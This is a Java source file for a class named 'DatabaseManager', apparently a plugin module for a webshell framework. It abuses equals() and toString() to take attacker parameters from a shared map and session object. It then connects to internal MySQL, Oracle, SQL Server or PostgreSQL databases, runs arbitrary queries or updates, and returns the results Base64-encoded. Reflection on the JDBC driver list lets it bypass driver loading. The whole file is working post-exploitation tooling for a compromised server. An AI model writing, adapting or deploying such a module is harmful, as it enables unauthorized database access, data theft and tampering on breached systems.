import java.util.HashMap;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Iterator;
import java.util.Properties;

public class DatabaseManager {
    // 用于Base64编码的字符集
    public static final char[] toBase64 = new char[]{'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
    
    private HashMap parameterMap;
    public static Object Session;

    public DatabaseManager() {
    }

    /**
     * 一个非常规的 equals 实现。它不检查相等性，
     * 而是用此方法作为向对象传递参数的方式，通过设置内部的 parameterMap。
     * @param paramObject 一个预期为 HashMap 的对象。
     * @return 如果参数映射设置成功，则返回 true，否则返回 false。
     */
    public boolean equals(Object paramObject) {
        try {
            this.parameterMap = (HashMap)paramObject;
            this.Session = this.parameterMap.get("httpSession");
        } catch (Exception e) {
            return false;
        }
        return true;
    }

    /**
     * 一个非常规的 toString 实现。它通过 `run()` 触发主要逻辑，
     * 将结果存储在参数映射中，然后将该映射置为 null。
     * @return 总是返回 null。
     */
    public String toString() {
        this.parameterMap.put("result", this.run().getBytes());
        this.parameterMap = null;
        return null;
    }

    /**
     * 主入口方法，根据methodName分发到具体功能
     */
    public String run() {
        String methodName = this.get("methodName");
        try {
            if (methodName == null) {
                return "error:methodName is null";
            }

            if (methodName.equals("execSql")) {
                return new String(this.execSql());
            } else if (methodName.equals("testConnection")) {
                return this.testConnection();
            }

            return "error:methodName is not found";
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    /**
     * 测试数据库连接
     */
    public String testConnection() {
        String dbType = this.get("dbType");
        String dbHost = this.get("dbHost");
        String dbPort = this.get("dbPort");
        String dbUsername = this.get("dbUsername");
        String dbPassword = this.get("dbPassword");
        
        if (dbType == null || dbHost == null || dbPort == null || dbUsername == null || dbPassword == null) {
            return "error:Missing required parameters";
        }

        try {
            // 先加载数据库驱动
            this.loadDatabaseDrivers();
            
            // 构建连接字符串
            String connectUrl = this.buildConnectionUrl(dbType, dbHost, dbPort);
            if (connectUrl == null) {
                return "error:Unsupported database type: " + dbType;
            }

            Connection dbConn = null;
            Exception lastException = null;
            
            // 尝试使用自定义getConnection方法
            try {
                dbConn = getConnection(connectUrl, dbUsername, dbPassword);
            } catch (Exception e1) {
                lastException = e1;
            }

            // 如果自定义方法失败或返回null，尝试标准DriverManager
            if (dbConn == null) {
                try {
                    dbConn = DriverManager.getConnection(connectUrl, dbUsername, dbPassword);
                } catch (Exception e2) {
                    String errorMsg = "Connection failed with URL: " + connectUrl;
                    if (lastException != null) {
                        errorMsg += ", Custom method error: " + lastException.getMessage();
                    }
                    errorMsg += ", DriverManager error: " + e2.getMessage();
                    return "error:" + errorMsg;
                }
            }

            if (dbConn != null) {
                dbConn.close();
                return "ok:Connection successful with URL: " + connectUrl;
            } else {
                return "error:Connection failed - both methods returned null for URL: " + connectUrl;
            }
        } catch (Exception e) {
            return "error:Unexpected error: " + e.getMessage();
        }
    }

    /**
     * 执行SQL查询
     * @return 查询结果或影响行数的字节数组。
     */
    public byte[] execSql() {
        String dbType = this.get("dbType"); // "mysql", "oracle", "sqlserver", "postgresql"
        String dbHost = this.get("dbHost");
        String dbPort = this.get("dbPort");
        String dbUsername = this.get("dbUsername");
        String dbPassword = this.get("dbPassword");
        String execType = this.get("execType"); // "select" 或 "update"
        String execSql = this.get("execSql");
        
        if (dbType == null || dbHost == null || dbPort == null || 
            dbUsername == null || dbPassword == null || 
            execType == null || execSql == null) {
            return "No parameter dbType,dbHost,dbPort,dbUsername,dbPassword,execType,execSql".getBytes();
        }

        try {
            // 尝试加载各种数据库驱动
            this.loadDatabaseDrivers();

            // 构建连接字符串
            String connectUrl = this.buildConnectionUrl(dbType, dbHost, dbPort);
            
            // 检查是否直接提供了JDBC URL
            if (dbHost.indexOf("jdbc:") != -1) {
                connectUrl = dbHost;
            }

            if (connectUrl != null) {
                try {
                    Connection dbConn = null;

                    try {
                        // 尝试使用自定义的getConnection方法获取连接
                        dbConn = getConnection(connectUrl, dbUsername, dbPassword);
                    } catch (Exception var16) {
                    }

                    if (dbConn == null) {
                        // 如果失败，则使用标准的DriverManager
                        dbConn = DriverManager.getConnection(connectUrl, dbUsername, dbPassword);
                    }

                    Statement statement = dbConn.createStatement();
                    if (!execType.equals("select")) {
                        // 执行更新/插入/删除操作
                        int affectedNum = statement.executeUpdate(execSql);
                        statement.close();
                        dbConn.close();
                        return ("Query OK, " + affectedNum + " rows affected").getBytes();
                    } else {
                        // 执行查询操作
                        String data = "ok\n";
                        ResultSet resultSet = statement.executeQuery(execSql);
                        ResultSetMetaData metaData = resultSet.getMetaData();
                        int columnNum = metaData.getColumnCount();

                        // 添加列名
                        int i;
                        for(i = 0; i < columnNum; ++i) {
                            data = data + this.base64Encode(String.format("%s", metaData.getColumnName(i + 1))) + "\t";
                        }

                        // 添加数据行
                        for(data = data + "\n"; resultSet.next(); data = data + "\n") {
                            for(i = 0; i < columnNum; ++i) {
                                data = data + this.base64Encode(String.format("%s", resultSet.getString(i + 1))) + "\t";
                            }
                        }

                        resultSet.close();
                        statement.close();
                        dbConn.close();
                        return data.getBytes();
                    }
                } catch (Exception var23) {
                    return var23.getMessage().getBytes();
                }
            } else {
                return ("no " + dbType + " Dbtype").getBytes();
            }
        } catch (Exception var24) {
            return var24.getMessage().getBytes();
        }
    }

    /**
     * 加载各种数据库驱动
     */
    private void loadDatabaseDrivers() {
        // SQL Server 驱动
        try {
            Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
        } catch (Exception e) {}

        // Oracle 驱动
        try {
            Class.forName("oracle.jdbc.driver.OracleDriver");
        } catch (Exception e) {
            try {
                Class.forName("oracle.jdbc.OracleDriver");
            } catch (Exception e2) {}
        }

        // MySQL 驱动
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
        } catch (Exception e) {
            try {
                Class.forName("com.mysql.jdbc.Driver");
            } catch (Exception e2) {}
        }

        // PostgreSQL 驱动
        try {
            Class.forName("org.postgresql.Driver");
        } catch (Exception e) {}
    }

    /**
     * 构建数据库连接字符串
     */
    private String buildConnectionUrl(String dbType, String dbHost, String dbPort) {
        String connectUrl = null;
        if ("mysql".equals(dbType)) {
            // 修复MySQL连接字符串：移除多余的斜杠，添加allowPublicKeyRetrieval参数
            connectUrl = "jdbc:mysql://" + dbHost + ":" + dbPort + "?useSSL=false&serverTimezone=UTC&zeroDateTimeBehavior=convertToNull&allowPublicKeyRetrieval=true";
        } else if ("oracle".equals(dbType)) {
            connectUrl = "jdbc:oracle:thin:@" + dbHost + ":" + dbPort + ":orcl";
        } else if ("sqlserver".equals(dbType)) {
            connectUrl = "jdbc:sqlserver://" + dbHost + ":" + dbPort + ";";
        } else if ("postgresql".equals(dbType)) {
            connectUrl = "jdbc:postgresql://" + dbHost + ":" + dbPort + "/";
        }
        return connectUrl;
    }

    /**
     * 一个健壮的获取数据库连接的方法。
     * 它通过反射查找DriverManager中已注册的所有驱动，并逐一尝试连接。
     * 这使得它更有可能在各种环境中成功连接数据库，即使驱动没有被正确地通过Class.forName加载。
     * @param url JDBC URL。
     * @param userName 用户名。
     * @param password 密码。
     * @return 数据库连接对象。
     */
    public static Connection getConnection(String url, String userName, String password) {
        Connection connection = null;

        try {
            Class driverManagerClass = Class.forName("java.sql.DriverManager");
            Field[] fields = driverManagerClass.getDeclaredFields();
            Field field = null;

            for(int i = 0; i < fields.length; ++i) {
                field = fields[i];
                if (field.getName().indexOf("rivers") != -1) {
                    Class listClass = Class.forName("java.util.List");
                    if (listClass.isAssignableFrom(field.getType())) {
                        break;
                    }
                }
                field = null;
            }

            if (field != null) {
                field.setAccessible(true);
                List drivers = (List)field.get((Object)null);
                Iterator iterator = drivers.iterator();

                while(iterator.hasNext() && connection == null) {
                    try {
                        Object object = iterator.next();
                        Driver driver = null;
                        Class driverClass = Class.forName("java.sql.Driver");

                        if (!driverClass.isAssignableFrom(object.getClass())) {
                            Field[] driverInfos = object.getClass().getDeclaredFields();

                            for(int i = 0; i < driverInfos.length; ++i) {
                                if (driverClass.isAssignableFrom(driverInfos[i].getType())) {
                                    driverInfos[i].setAccessible(true);
                                    driver = (Driver)driverInfos[i].get(object);
                                    break;
                                }
                            }
                        } else {
                            driver = (Driver)object;
                        }

                        if (driver != null) {
                            Properties properties = new Properties();
                            if (userName != null) {
                                properties.put("user", userName);
                            }

                            if (password != null) {
                                properties.put("password", password);
                            }

                            connection = driver.connect(url, properties);
                        }
                    } catch (Exception e) {
                    }
                }
            }
        } catch (Exception e) {
        }

        return connection;
    }

    /**
     * 对字符串进行Base64编码。
     * @param data 输入字符串。
     * @return Base64编码后的字符串。
     */
    public String base64Encode(String data) {
        return base64Encode(data.getBytes());
    }

    /**
     * 对字节数组进行Base64编码的自定义实现。
     * @param src 源字节数组。
     * @return Base64编码后的字符串。
     */
    public static String base64Encode(byte[] src) {
        int off = 0;
        int end = src.length;
        byte[] dst = new byte[4 * ((src.length + 2) / 3)];
        int linemax = -1;
        boolean doPadding = true;
        char[] base64 = toBase64;
        int sp = off;
        int slen = (end - off) / 3 * 3;
        int sl = off + slen;
        if (linemax > 0 && slen > linemax / 4 * 3) {
            slen = linemax / 4 * 3;
        }

        int dp;
        int b0;
        int b1;
        for(dp = 0; sp < sl; sp = b0) {
            b0 = Math.min(sp + slen, sl);
            b1 = sp;

            int bits;
            for(int dp0 = dp; b1 < b0; dst[dp0++] = (byte)base64[bits & 63]) {
                bits = (src[b1++] & 255) << 16 | (src[b1++] & 255) << 8 | src[b1++] & 255;
                dst[dp0++] = (byte)base64[bits >>> 18 & 63];
                dst[dp0++] = (byte)base64[bits >>> 12 & 63];
                dst[dp0++] = (byte)base64[bits >>> 6 & 63];
            }

            b1 = (b0 - sp) / 3 * 4;
            dp += b1;
        }

        if (sp < end) {
            b0 = src[sp++] & 255;
            dst[dp++] = (byte)base64[b0 >> 2];
            if (sp == end) {
                dst[dp++] = (byte)base64[b0 << 4 & 63];
                if (doPadding) {
                    dst[dp++] = 61;
                    dst[dp++] = 61;
                }
            } else {
                b1 = src[sp++] & 255;
                dst[dp++] = (byte)base64[b0 << 4 & 63 | b1 >> 4];
                dst[dp++] = (byte)base64[b1 << 2 & 63];
                if (doPadding) {
                    dst[dp++] = 61;
                }
            }
        }

        return new String(dst);
    }

    /**
     * 从参数映射中获取字符串值
     */
    public String get(String key) {
        Object value = this.parameterMap.get(key);
        if (value == null) {
            return null;
        }
        if (value instanceof String) {
            return (String) value;
        }
        if (value instanceof byte[]) {
            try {
                return new String((byte[]) value, "UTF-8");
            } catch (Exception e) {
                return null;
            }
        }
        return value.toString();
    }
}
